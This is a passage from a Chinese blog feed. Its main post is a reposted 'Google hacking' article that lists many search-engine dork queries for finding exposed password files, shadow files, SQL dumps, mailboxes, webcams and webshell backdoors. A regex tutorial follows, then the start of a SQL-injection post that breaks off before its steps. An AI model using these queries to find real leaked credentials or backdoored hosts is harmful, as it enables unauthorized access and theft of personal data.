    <content type="html"><![CDATA[<h1 id="GOOGLE-HACKING（转）"><a href="#GOOGLE-HACKING（转）" class="headerlink" title="GOOGLE HACKING（转）"></a>GOOGLE HACKING（转）</h1><h2 id="一-Google-Hacking背景："><a href="#一-Google-Hacking背景：" class="headerlink" title="一.Google Hacking背景："></a>一.Google Hacking背景：</h2><p> Google 是全球功能最强大的搜索引擎之一。伴随其强大的功能产生了利用Google 进行的黑客活动——Google Hacking。其攻击范围相当广，包括：国防军事、企业密函、个人财产和安全等等。不怀好意的黑客们往往利用Google去寻找有漏洞的服务器和文件、 口令记录、公开的目录、基于网络的设备管理台等等。由此可见，Google hacking 的巨大的威胁性以及研究的必要性。<br>1995年Johnny Long开始研究利用Google来测试网站和电脑的安全隐患，由此而发展了Google hacking，他建立的 <a href="http://johnny.ihackstuff.com/">http://johnny.ihackstuff.com/</a>  现今成为Google Hacking Data-base。2004年 Robert Masse 和 Jian  Hui Wang全面分析了Google hacking的四大应用，同时给出利用相关工具的例证和防范Google hacking的方法。目前相关的研究报告各自有侧重点，没能够很好的从整体角度来全面的分析Google hacking的产生原因，总体归纳出高级攻击方式和攻击规律，系统的介绍相关应用软件以及防范Google hacking的具体实例。本文将就此利用相关实例具体说明。</p><h2 id="二-Google-Hacking-的常见方式"><a href="#二-Google-Hacking-的常见方式" class="headerlink" title="二.Google Hacking 的常见方式:"></a>二.Google Hacking 的常见方式:</h2><h5 id="1-基本搜索方式"><a href="#1-基本搜索方式" class="headerlink" title="1. 基本搜索方式"></a>1. 基本搜索方式</h5><p> Google提供了强大的搜索功能：</p><p> 常用的基本搜索指令有：<br> （1）逻辑与/或：AND、OR<br> （2）逻辑非：-<br> （3）完整匹配：”…”<br> （4）通配符：*  ?  </p><h5 id="2-高级搜索指令"><a href="#2-高级搜索指令" class="headerlink" title="2.高级搜索指令"></a>2.高级搜索指令</h5><p>Google高级预定义搜索语法如下：<br>intitle:表示搜索在网页标题中出现第一个关键词的网页。<br>例如“intitle:黑客技术 ”将返回在标题中出现“黑客技术 ”的所有链接。 用“allintitle: 黑客技术 Google”则会返回网页标题中同时含有 “黑客技术” 和 “Google” 的链接。</p><p>intext:返回网页的文本中出现关键词的网页。用allintext:搜索多个关键字。</p><p>inurl:返回的网页链接中包含第一个关键字的网页。</p><p>site:在某个限定的网站中搜索。</p><p>filetype:搜索特定扩展名的文件（如.doc  .pdf .ppt）。<br>黑客们往往会关注特定的文件，例如：.pwl口令文件、.tmp临时文件、.cfg配置文件、.ini系统文件、.hlp帮助文件、.dat 数据文件、.log日志文件、.par交换文件等等。</p><p>link:表示返回所有链接到某个地址的网页。</p><p>related：返回连接到类似于指定网站的网页。</p><p>cache:搜索Google缓存中的网页。</p><p>info:表示搜索网站的摘要。例如“info:whu.edu.cn”仅得到一个结果： </p><p>phonebook: 搜索电话号码簿，将会返回美国街道地址和电话号码列表,这无疑给挖掘个人信息的黑客带来极大的便利。</p><p>同时还可以得到住宅的全面信息，结合Google earth将会得到更详细的信息。相应的还有更小的分类搜索：rphonebook:仅搜索住宅用户电话号码簿；bphonebook:仅搜索商业的电话号码簿。</p><p> 另外，还有一些不常用的搜索指令。列表如下：（此列表转载自网络）<br> author:搜索新闻组帖子的作者。<br> group:搜索Google组搜索词汇帖子的题目。<br> msgid:搜索识别新闻组帖子的Google组信息标识符和字符串。<br> insubject:搜索Google组的标题行。<br> stocks:搜索有关一家公司的股票市场信息。<br> define:返回一个搜索词汇的定义。<br> inanchor:搜索一个HTML标记中的一个链接的文本表现形式。<br> daterange:搜索某个日期范围内Google做索引的网页。  </p><h5 id="3-Google-hacking常见的攻击规律"><a href="#3-Google-hacking常见的攻击规律" class="headerlink" title="3. Google hacking常见的攻击规律"></a>3. Google hacking常见的攻击规律</h5><p> Google hacking主要是发现那些 公告文件，安全漏洞，错误信息， 口令文件， 用户文件， 演示页面，登录页面， 安全文件， 敏感目录，商业信息，漏洞主机， 网站服务器检测等信息。攻击规律有：</p><h6 id="A．利用“Index-of”语法检索出站点的活动索引目录"><a href="#A．利用“Index-of”语法检索出站点的活动索引目录" class="headerlink" title="A．利用“Index of”语法检索出站点的活动索引目录"></a>A．利用“Index of”语法检索出站点的活动索引目录</h6><p> Index 就是主页服务器所进行操作的一个索引目录。黑客们常利用目录获取密码文件和其他安全文件。常用的攻击语法如下：<br> Index of /admin 可以挖掘到安全意识不强的管理员的机密文件：</p><p> 黑客往往可以快速地提取他所要的信息。其他Index of 语法列表如下：（此列表为转载）<br> Index of /passwd<br> Index of /password<br> Index of /mail<br> “Index of /” +passwd<br> “Index of /” +password.txt<br> “Index of /” +.htaccess<br> “Index of /secret”<br> “Index of /confidential”<br> “Index of /root”<br> “Index of /cgi-bin”<br> “Index of /credit-card”<br> “Index of /logs”<br> “Index of /config”  </p><h6 id="B、利用“inurl-”寻找易攻击的站点和服务器"><a href="#B、利用“inurl-”寻找易攻击的站点和服务器" class="headerlink" title="B、利用“inurl:”寻找易攻击的站点和服务器"></a>B、利用“inurl:”寻找易攻击的站点和服务器</h6><p> (1)利用“allinurl:winnt/system32/”寻找受限目录“system32”，一旦具备 cmd.exe 执行权限，就可以控制远程的服务器。</p><p> (2)利用“allinurl:wwwboard/passwd.txt”搜寻易受攻击的服务器。</p><p> (3)利用“inurl:.bash_history”搜寻服务器的“.bash_history”文件。这个文件包括超级管理员的执行命令，甚至一些敏感信息，如管理员口令序列等。例如：</p><p> (4)利用“inurl:config.txt”搜寻服务器的“config.txt”文件，这个文件包括管理员密码和数据认证签名的hash值。</p><p> (5)其他语法的搜索。（如下分类为转载）<br>　　　　inurl:admin filetype:txt<br>　　　　inurl:admin filetype:db<br>　　　　inurl:admin filetype:cfg<br>　　　　inurl:mysql filetype:cfg<br>　　　　inurl:passwd filetype:txt<br>　　　　inurl:iisadmin<br>　　　　allinurl:/scripts/cart32.exe<br>　　　　allinurl:/CuteNews/show_archives.php<br>　　　　allinurl:/phpinfo.php<br>　　　　allinurl:/privmsg.php<br>　　　　allinurl:/privmsg.php<br>　　　　inurl:auth_user_file.txt<br>　　　　inurl:orders.txt<br>　　　　inurl:“wwwroot/*.”<br>　　　　inurl:adpassword.txt<br>　　　　inurl:webeditor.php<br>　　　　inurl:file_upload.php<br>　　　　inurl:gov filetype:xls “restricted”<br>　　　　index of ftp +.mdb allinurl:/cgi-bin/ +mailto　　  　　</p><h6 id="C、利用“intitle-”寻找易攻击的站点或服务器"><a href="#C、利用“intitle-”寻找易攻击的站点或服务器" class="headerlink" title="C、利用“intitle:”寻找易攻击的站点或服务器"></a>C、利用“intitle:”寻找易攻击的站点或服务器</h6><p> （1）利用 intitle:”php shell*” “Enable stderr” filetype:php查找安装了php webshell后门的主机，并测试是否有能够直接在机器上执行命令的web shell。（<a href="http://worldispnetwork.com/phpinfo.php%EF%BC%89">http://worldispnetwork.com/phpinfo.php）</a> </p><p> （2）利用allintitle:“index of /admin”搜寻服务器的受限目录入口“admin”。</p><p>　　（3）其他语法的搜索。（如下分类为转载）<br>　　　　intitle:“Index of” .sh_history<br>　　　　intitle:“Index of” .bash_history<br>　　　　intitle:“index of” passwd<br>　　　　intitle:“index of” people.lst<br>　　　　intitle:“index of” pwd.db<br>　　　　intitle:“index of” etc/shadow<br>　　　　intitle:“index of” spwd<br>　　　　intitle:“index of” master.passwd<br>　　　　intitle:“index of” htpasswd<br>　　　　intitle:“index of” members OR accounts<br>　　　　intitle:“index of” user_carts OR user_cart<br>　　　　allintitle: sensitive filetype:doc<br>　　　　allintitle: restricted filetype :mail<br>　　　　allintitle: restricted filetype:doc site:gov　  　　　</p><p> Johnny Long在《Google hacking for penetration testers》中详细的介绍Google hacking的常用高级搜索方式，详细列表如下：（此列表转载自网络）</p><p>For site<br>site:csdn.net –<a href="http://www.csdn.net/">www.csdn.net</a> –blog.csdn.net/cnasp<br>inurl:nqt.php intitle: “network query tool”<br>inurl:”/cgi-bin/userreg.cgi”<br>filetype:asp “custom error message”<br>“asp.net_sessionid” “data source=”<br>Intext: “warning:failed opening” include_path<br>“http_from=googlebot” googlebot.com “server_software”<br>intitle:”lantronix web-managerintitle:”lantronix web-manager”<br>intitle:”index of “ back files<br>inurl:admin backup<br>allinurl:admin backup<br>filetype:doc doc<br>info:blog.csdn.net<br>related:<a href="http://www.sina.com/">www.sina.com</a><br>define:ironic<br>site:blog.csdn.net inurl:csdn<br>intitle:index.of “parent directory”<br>intitle:index.of inurl:admin<br>intitle:index.of ws_ftp.log<br>intitle:index.of “server at”<br>intitle:index.of inurl:”admin/*”  </p><p>For Web Servers<br>“AnWeb/1.42h” intitle:index.of<br>“Apache Tomcat/“ intitle:index.of<br>“Apche-AdvancedExtranetServer/“ intitle:index.of<br>“Apach/df-ets” intitle:index.of<br>“Apach/“ “server at” intitle:index.of<br>“Apache/AmEuro” intitle:index.of<br>“Apache/Blast” intitle:index.of<br>“Apache/WWW” intitle:index.of<br>“Apache/df-exts” intitle:index.of<br>“CERN httpd 3.0B (VAX VMS)” intitle:index.of<br>fitweb-wwws * server at intitle:index.of<br>HP Apache-based Web “Server/<em>“ intitle:index.of<br>OpenSSL/0.9g intitle:index.of<br>“httpd+ssl/kttd” * server at intitle:index.of<br>“JRun Web Server” intitle:index.of<br>“MaXX/3.1” intitle:index.of<br>“Microsoft-ISS/*” server at intitle:index.of<br>“Microsoft-ISS/</em>“ intitle:index.of<br>“OmniHTTPd/2.10” intitle:index.of<br>“OpenSA/1.0.4” intitle:index.of<br>“Oracle HTTP Server Powered by Apache” intitle:index.of<br>“Red Hat Secure/<em>“ server at intitle:index.of<br>SEDWebserver * server at intitle:index.of<br>“Apache/*” intitle:index.of<br>“Apache/</em>“ server at intitle:index.of<br>filetype:pst pst(contacts | address | inbox)<br>filetype:reg reg +intext: “internet account manager”  </p><p>For E-Mail Address<br>“Internal server error” “server at”<br>Intitle:”execution of this script not permitted”<br>e-mail address filetype:csv csv<br>intitle:index.of dead.letter<br>inurl:fcgi-bin/echo<br>filetype:pst pst –from –to –data<br>intitle:inde.of inbox<br>intitle: “index of “ –inurl:maillog maillog size<br>inurl:email filetype:mdb<br>filetype:xls inrul: “email.xls”<br>filetype:xls username password email<br>intitle:index.of inbox dbx<br>filetype:eml eml eml +intext: “subject” +intext: “from”<br>intitle:index.of inbox dbx<br>filetype:wab wab<br>filetype:pst inrul: “outlook.pst”<br>filetype:mbx mbx intext:subject<br>inurl:cgi-bin/printenv<br>inurl:forward filetype:forward –cvs<br>filetype:mail intext:password subject<br>filetype:eml intext:password subject<br>filetype:mbx intext:password subject<br>filetype:mbx intext:password subject  </p><p>For network devices<br>inurl:indexframe.shtml axis<br>intitle: “live view / -axis”<br>intitle: “live view/ -axis”<br>inurl:view/view.sht<br>intitle: “the axis 200 home page”<br>intitle:liveapplet inurl:lvappl<br>intext: “mobotix m1” intext: “open menu”<br>intitle; “viewerframe?mode=”<br>snc-rz30 home<br>intitle:flexwatch intext: “home page ver”<br>intitle:snc-z20 inurl:home/<br>“powered by webcamxp” “pro\broadcast”<br>Intitle: “remote ui:top page”<br>(“fiery webtools” inurl:index2.html)<br>“webtools enable observe, , flow print jobs”<br>Intitle: “network administration” inurl: “nic”<br>Inurl:sts_index.cgi<br>Intitle:ricoh intitle: “network administration”<br>Intitle: “view and configure phaserlink”<br>Inurl:live_status.html<br>“phaser 6250” “printer neighborhood”<br>“phaser? 740 color printer” “printer named:” phaserlink<br>“phaser 8200” “? xerox” “refresh” “email alerts”<br>phaser? 840 color printer<br>intext:centreware inurl:status<br>intitle: “Xerox workcentre pro -index”  </p><p>For usernames<br>“your username is”<br>Inurl:admin inurl:userlist<br>Inurl:admin filetype:asp<br>Inurl:userlist<br>Inurl:php inurl:hlstats intext;server username<br>Filetype:ctl inurl:haccess.ctl basic<br>Filetype:reg reg intext: “internet account manager”<br>Filetype:wab wab<br>Filetype:mdb inurl:profiles<br>Index.of perform.ini<br>Inurl:root.asp?acs=anon<br>Filetype:conf inurl:proftpd.conf –sample<br>Filetype:log username putty<br>Filetype:rdp rdp<br>Intitle:index.of .bash_history<br>Intitle:index.of .sh_history<br>“index of “ lck<br>+intext:webalizer +intext:total usernames +intext: “usage   statistics for”<br>Filetype:reg reg hkey_current_user username  </p><p>For password information<br>Inurl:/db/main.mdb<br>Filetype:cfm “cfapplication name” password<br>Filetype:pass pass intext:userid<br>Allinurl:auth_user_file.txt<br>Eggdrop filetype:user user<br>Filetype:ini inurl:flashfxp.ini<br>Filetype:url +inurl: ftp:// +inurl: “@”<br>Inurl:zebra.conf intext:password –sample –test –tutorial –download<br>Filetype:htpasswd htpasswd<br>Intitle: “index of” “.htpasswd” “htgroup” –intitle: “dist” –apache –htpasswd.c<br>Intitle: “index of” “.htpasswd” htpasswd.bak<br>http://<em>.</em>@www bob:bob “sets mode: +k”<br>“your password if * remember this for later use”<br>Signin filetype:url<br>Leapftp intile: “index.of./“ sites.ini modified<br>Inurl:lilo.conf filetype:conf password –tatercounter2000 –bootpwd –man<br>Filetype:config config intext:appsettings “user id”<br>Filetype:pwd service<br>Intitle:index.of administrators.pwd<br>“# -frontpage-“inurl:service.pwd ext:pwd inurl:_vti_pvt   inurl:(service|authos|administrators)<br>Inurl: “index of “intext:globals.inc/.bak<br>Filetype:confoekakibbs<br>Filetype:dat wand.dat<br>Inurl:ospfd.conf intext:password –sample –test –tutorial –download<br>Index.of passlist<br>Inurl:passlist.txt<br>Filetype:dat “password.dat”<br>Inurl:password.log filetype:log<br>Filetype:log inurl: “password.log”<br>Inurl:people.lst filetype:lst<br>Intitle:index.of config.php<br>Inurl:config.php dbuname dbpass<br>Inurlnuke filetype:sql<br>Filetype:conf inurl:psybnc.conf “user.pass=”<br>Filetype:ini servudaemon<br>Filetype:conf slapd.conf<br>Inurl: “slapd.conf” intext: “credentials” –manpage -“manual page” –man: -sample<br>Inurl: “slapd.conf” intext: “rootpw” –manpage -“manual page” –man: -sample<br>Filetype:sql “identified by” –cvs<br>Filetype:sql password<br>Filetype:ini wcx_ftp<br>Filetype:netrc password<br>Index.of.etc tial files<br>Intitle: “index of ..etc” passwd<br>Intitle:index.of passwd passwd.bak<br>Intitle: “index of” pwd.db<br>Intitle:index.of etc shadow<br>Intitle:index.of master.passwd<br>Intitle: “index of” spwd.db passwd –pam.conf<br>Filetype:bak inurl: “htaccess| passwd |shadow |htusers”<br>Filetype:inc dbconn<br>Filetype:inc intext:mysql_connect<br>Filetype:properties inurl:db<br>Intext:password<br>Inurl:vtund.conf intext:pass –cvs<br>Inurl: “wvdial.conf” intext; “password”<br>Filetype:mdb wwforum<br>“autocreate=true password=*”<br>Filetype:pwl pwl<br>Filetype:reg reg +intext; “defaultusername” intext:   “defaultpassword”<br>Filetype:reg reg +intext: “internet account manager”<br>Filetype:xls username password email<br>Filetype:xls inurl: “password.xls”<br>Filetype;xls private<br>Inurl:admin filetype:xls<br>Filetype:xls inurl:contact<br>Filetype:xls inurl: “email.xls”<br>Allinurl:admin mdb<br>Filetype:mdb inurl:users.mdb<br>Inurl:email filetype:mdb<br>Inurl:backup filetype:mdb<br>Inurl:profiles filetype:mdb<br>Inurl:*db filetype:mdb  </p><p>For sql database dumps<br>Inurl:nuke filetype:sql<br>Filetype:sql password<br>Filetype:sql “indetified by” –cvs<br>“#dumping data for table username user users password”<br>“#mysql dump” filetype:sql<br>“#phpmyadmin mysql-dump” filetype:txt<br>“#phpmyadmin mysql-dump”<br>“insert into” –”the  </p><p>For database files<br>Filetype:cfm “cfapplication name “ password<br>Filetype:mdb inurl:user.mdb<br>Inurl:email filetype:mdb<br>Inurl:forum filetype:mdb<br>Inurl:/db/main.mdb<br>Inurl:profiles filetype:mdb<br>Filetype:asp dbq=”* server.mappath(“mdb”)”<br>Allinurl;admin mdb  </p><h2 id="三．Google-Hacking-工具分析"><a href="#三．Google-Hacking-工具分析" class="headerlink" title="三．Google Hacking 工具分析"></a>三．Google Hacking 工具分析</h2><p> 常见Google Hacking的工具有 gooscan  goolink  wikto  Athena  Sitedigger   </p><h6 id="A．Gooscan"><a href="#A．Gooscan" class="headerlink" title="A．Gooscan"></a>A．Gooscan</h6><p>   gooscan是UNIX系统下对google的搜寻工具,可自动查询，用作外部服务器评估和信息收集阶段目标的攻击性评价终端。）  </p><h6 id="B-Athena-支持开放的XML配置和多种搜索引擎，相当于hacker搜索集成工具。"><a href="#B-Athena-支持开放的XML配置和多种搜索引擎，相当于hacker搜索集成工具。" class="headerlink" title="B.Athena 支持开放的XML配置和多种搜索引擎，相当于hacker搜索集成工具。"></a>B.Athena 支持开放的XML配置和多种搜索引擎，相当于hacker搜索集成工具。</h6><h6 id="C-Wikto"><a href="#C-Wikto" class="headerlink" title="C.Wikto"></a>C.Wikto</h6><p>可以寻找到网页索引文件，如通讯录和档案网址。同时它还能搜寻出滥用的脚本和可以直接执行命令的网络服务器。Googler的主要功能是发现站点的索引目录，需要一个 Google web API key。</p><h6 id="D-SiteDigger"><a href="#D-SiteDigger" class="headerlink" title="D.SiteDigger"></a>D.SiteDigger</h6><p> Sitedigger 能够批量处理搜索要求。在获取Google API   许可文件之后可以通过搜索引擎自动的寻找出站点的易受攻击点。<br> （参照 Kartik Trivedi 《Identifying Information Leakage Using Search Engines》）</p><h6 id="E．Goolink"><a href="#E．Goolink" class="headerlink" title="E．Goolink"></a>E．Goolink</h6><p>   Goolink 能够删除用户检索的缓存，收集和显示你所需要的链接，很容易发现向google敞开的攻击弱点，并且可以自定义搜索方式或者导入 Googledorks 文件。</p><h2 id="四。防范措施"><a href="#四。防范措施" class="headerlink" title="四。防范措施"></a>四。防范措施</h2><p>   提出反搜索引擎的架构（处于完善阶段……）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;GOOGLE-HACKING（转）&quot;&gt;&lt;a href=&quot;#GOOGLE-HACKING（转）&quot; class=&quot;headerlink&quot; title=&quot;GOOGLE HACKING（转）&quot;&gt;&lt;/a&gt;GOOGLE HACKING（转）&lt;/h1&gt;&lt;h2 id=&quot;一-Goo
      
    
    </summary>
    
    
      <category term="技术" scheme="http://yoursite.com/child/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="Google hacking" scheme="http://yoursite.com/child/tags/Google-hacking/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式学习笔记</title>
    <link href="http://yoursite.com/child/2018/01/14/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/child/2018/01/14/正则表达式学习笔记/</id>
    <published>2018-01-14T13:32:17.000Z</published>
    <updated>2018-02-27T04:20:48.085Z</updated>
    
    <content type="html"><![CDATA[<h1 id="正则表达式学习笔记"><a href="#正则表达式学习笔记" class="headerlink" title="正则表达式学习笔记"></a>正则表达式学习笔记</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>正则表达式regular expression(也称“regex”或“regexp”)是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。  </p><p>举个例子：在平时的计算机操作中，当我们搜索一个文件时，希望找到所有的Word文档，可以在搜索栏的文件名中输入“*.doc”来匹配所有以“.doc”结尾的文件名，“*”被称为通配符，可以任意匹配字符串。正则表达式的作用就类似于这种应用。  </p><h2 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h2><p>在JavaScript和php中，正则表达式是由两条斜杠“/”所包围的（Java则不用，由于正则表达式是数学概念，在不同的语言中核心语法是相似的，只是存在细微差别，这里我主要针对的是js）。  </p><p>正则表达式语言由两种基本字符类型组成：原义（正常）文本字符和元字符。元字符使正则表达式具有处理能力。所谓元字符就是指那些在正则表达式中具有特殊意义的专用字符，可以用来规定其前导字符（即位于元字符前面的字符）在目标对象中的出现模式，描述文本模式的表达对象。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var reg01&#x3D;&#x2F;abc&#x2F;;</span><br><span class="line">var reg02&#x3D;&#x2F;a&#123;1,2&#125;b&#x2F;g;</span><br><span class="line">var reg03&#x3D;&#x2F;a&#123;1,2&#125;b&#x2F;ig;</span><br><span class="line">var reg04&#x3D;&#x2F;^[\u0391-\uFFE5]+$&#x2F;i;</span><br></pre></td></tr></table></figure><p>上面实例中，第二个/后面的“ig”等是匹配模式，可选。其含义分为：  </p><ul><li><input disabled="" type="checkbox"> “i”为“ignore case”，即忽略大小写。</li><li><input disabled="" type="checkbox"> “g”为“global search”，即全局搜索。</li><li><input disabled="" type="checkbox"> “m”为“multiline search”，即多行搜索。  </li></ul><h2 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h2><p>正则表达式的两个斜杠之间的模式字符串如果为一般的字母或数字，表示直接匹配相应的字符。例如“/abcd/”匹配字符串“abcd123”中“abcd”的部分。花括号“{”等特殊字符在正则表达式中，又有其特殊的含义。下面是正则表达式中各字符的匹配含义。  </p><h4 id="一、普通字符"><a href="#一、普通字符" class="headerlink" title="一、普通字符"></a>一、普通字符</h4><p>普通字符包括没有显式指定为元字符的所有可打印和不可打印字符。这包括所有大写和小写字母、所有数字、所有标点符号和一些其他符号。  </p><h4 id="二、非打印字符"><a href="#二、非打印字符" class="headerlink" title="二、非打印字符"></a>二、非打印字符</h4><p>非打印字符也可以是正则表达式的组成部分。下表列出了表示非打印字符的转义序列：<br><img src="http://ww3.sinaimg.cn/large/0060lm7Tly1fnfasb6191j30si0dm750.jpg" alt="非打印字符"></p><h4 id="三、特殊字符"><a href="#三、特殊字符" class="headerlink" title="三、特殊字符"></a>三、特殊字符</h4><p>所谓特殊字符，就是一些有特殊含义的字符，如”*.txt”中的*，简单的说就是表示任何字符串的意思。如果要查找文件名中有*的文件，则需要对*进行转义，即在其前加一个\。ls\ *.txt。</p><p>许多元字符要求在试图匹配它们时特别对待。若要匹配这些特殊字符，必须首先使字符”转义”，即，将反斜杠字符 () 放在它们前面。下表列出了正则表达式中的特殊字符：<br><img src="http://ww4.sinaimg.cn/large/0060lm7Tly1fnfaurs77ej30si0j8dh5.jpg" alt="特殊字符"><br>补充<br><img src="http://ww3.sinaimg.cn/large/0060lm7Tly1fngg0n9a9bj30b60963z4.jpg" alt="元字符补充"></p><h4 id="四、限定符"><a href="#四、限定符" class="headerlink" title="四、限定符"></a>四、限定符</h4><p>限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有*或+或?或{n}或{n,}或{n,m}共6种。</p><p>正则表达式的限定符有：<br><img src="http://ww1.sinaimg.cn/large/0060lm7Tly1fnfavvxvudj30sd0d5dgw.jpg" alt="限定字符"></p><h4 id="五、定位符"><a href="#五、定位符" class="headerlink" title="五、定位符"></a>五、定位符</h4><p>定位符使您能够将正则表达式固定到行首或行尾。它们还使您能够创建这样的正则表达式，这些正则表达式出现在一个单词内、在一个单词的开头或者一个单词的结尾。</p><p>定位符用来描述字符串或单词的边界，^和$分别指字符串的开始与结束，\b描述单词的前或后边界，\B表示非单词边界。<br><img src="http://ww1.sinaimg.cn/large/0060lm7Tly1fnfaxh7gagj30sc08u3yt.jpg" alt="定位符"><br>注意：不能将限定符与定位点一起使用。由于在紧靠换行或者字边界的前面或后面不能有一个以上位置，因此不允许诸如 ^* 之类的表达式。 </p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>下面我们找几个实际的例子来分析一下，就更加明白了。  </p><ol><li>校验中文<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">^[\u4e00-\u9fa5]&#123;0,&#125;$</span><br><span class="line">&#96;&#96;&#96;  </span><br><span class="line">^开始[]中是要匹配的主要内容，其中的\u4e00是一个汉字的Unicode编码，而\u4e00-\u9fa5就表示所有汉字的Unicode编码，后面的&#123;0,&#125;表示至少匹配0次，最多不限制长度，$结束。</span><br><span class="line">2. 验证身份证号（18位）  </span><br></pre></td></tr></table></figure>^[1-9]\d{5}[1-9]\d{3}((0\d)|(1[0-2]))(([0|1|2]\d)|3[0-1])\d{3}([0-9]|X)$<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">^开始[1-9]匹配1-9数字中的一个，\d&#123;5&#125;表示匹配5个0-9的数字，后面的一样体会，((0\d)|(1[0-2]))这一段是单独括出来表示年份的，|表示的或条件（左右二选一），0\d是0+一个数字，1[0-2]是1+0,1,2,中的一个，后面表示年月的类似，最后面的([0-9]|X)则是给定了身份证最后一位要么是0-9数字，要么是X，$结束正则表达式  </span><br><span class="line">3. 验证email地址  </span><br><span class="line"></span><br></pre></td></tr></table></figure>^\w+([-+.]\w+)*@\w+([-.]\w+)<em>.\w+([-.]\w+)</em>$<pre><code>^开始\w匹配数字字母下划线或汉字，表示匹配前面的表达式一次或多次，考虑到用户脑回路比较清奇[+-.]表示匹配其中的+-.其中一个，*匹配前面的子表达式一次或多次，后面大致相同理解，其中\\.是转义字符就表示.，$结束</code></pre></li></ol><p>这里举的例子不多，可以看看下面参考文献中的二十个常用的正则表达式  </p><h2 id="贪婪与非贪婪模式"><a href="#贪婪与非贪婪模式" class="headerlink" title="贪婪与非贪婪模式"></a>贪婪与非贪婪模式</h2><p>贪婪匹配:正则表达式一般趋向于最大长度匹配，也就是所谓的贪婪匹配。如上面使用模式p匹配字符串str，结果就是匹配到：abcaxc(ab*c)。  </p><p>非贪婪匹配：就是匹配到结果就好，就少的匹配字符。如上面使用模式p匹配字符串str，结果就是匹配到：abc(ab*c)。  </p><p>仅从应用角度分析，可以这样认为，非贪婪模式，就是在整个表达式匹配成功的前提下，尽可能少的匹配，也就是所谓的“非贪婪”，通俗点讲，就是找到一个想要的捡起来就行了，至于还有没有没捡的就不管了。<br>这里要更深入了解具体可看参考文献。</p><h6 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h6><p><a href="https://www.cnblogs.com/francisblogs/p/6100665.html">正则表达式之基础语法</a><br><a href="http://deerchao.net/tutorials/regex/regex.htm">正则表达式30分钟入门教程</a>（推荐必看）<br><a href="https://zhuanlan.zhihu.com/p/25400344">Python正则表达式指南</a><br><a href="https://zhuanlan.zhihu.com/p/29163295">知道这20个正则表达式，能让你少写1,000行代码</a><br><a href="http://www.9958.pw/post/preg_match">正则基础(贪婪与非贪婪模式)</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;正则表达式学习笔记&quot;&gt;&lt;a href=&quot;#正则表达式学习笔记&quot; class=&quot;headerlink&quot; title=&quot;正则表达式学习笔记&quot;&gt;&lt;/a&gt;正则表达式学习笔记&lt;/h1&gt;&lt;h2 id=&quot;定义&quot;&gt;&lt;a href=&quot;#定义&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
      <category term="技术" scheme="http://yoursite.com/child/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="正则表达式" scheme="http://yoursite.com/child/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入基本步骤</title>
    <link href="http://yoursite.com/child/2018/01/06/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4/"/>
    <id>http://yoursite.com/child/2018/01/06/SQL注入基本步骤/</id>
    <published>2018-01-06T12:02:16.000Z</published>
    <updated>2018-04-25T09:55:10.665Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL注入基本步骤"><a href="#SQL注入基本步骤" class="headerlink" title="SQL注入基本步骤"></a>SQL注入基本步骤</h1><h2 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h2><p>首先我们要知道的是SQL到底是什么。。。<br><a href="https://baike.baidu.com/item/sql%E8%AF%AD%E5%8F%A5/5714895?fr=aladdin">sql语句百度百科</a></p><h2 id="SQL注入介绍"><a href="#SQL注入介绍" class="headerlink" title="SQL注入介绍"></a>SQL注入介绍</h2><p>在正式开始之前，我们先讲讲什么是SQL注入。还记得小学语文考试上的填空题吗？</p><p>我是<strong><strong><strong><strong><strong><strong><strong><em>，喜欢____</em></strong></strong></strong></strong></strong></strong></strong></p><p>题目的意图明显是通过填空来了解答题者的名字和爱好。</p><p>如果填成下面这样呢？ </p><blockquote><p>我是调皮的小男孩子，专职撩妹子。，<del>喜欢_____________</del>  </p></blockquote><p>这就是一个注入的例子，当出题者以为他已经定下了句子的主体结构，需要填空的内容是不会影响主体结构的，而填空者却通过填写的内容，修改了整句话的结构，这就是注入。</p><p>以王宝强马蓉两人为例，对于王宝强来说，请来的经纪人是工作上的一部分，这也是他定下来的人生结构。他却没有想到，经纪人除了完成经纪人所应做的事情，还在背后干起别的事情来。对于王宝强来说，经纪人做的事情，就是一种注入，改变了他定义的结构组织。</p><p>那什么是SQL注入就不言而喻了。当黑客通过精心构造的URL参数，或者表单提交的参数，拼接到预先定义好的SQL格式时，意外地改变了程序员预期的SQL结构时，SQL注入就构成了。执行该SQL语句已超出的程序员的意图。</p><h3 id="普通SQL注入步骤"><a href="#普通SQL注入步骤" class="headerlink" title="普通SQL注入步骤"></a>普通SQL注入步骤</h3><h4 id="1-判断是否可以注入"><a href="#1-判断是否可以注入" class="headerlink" 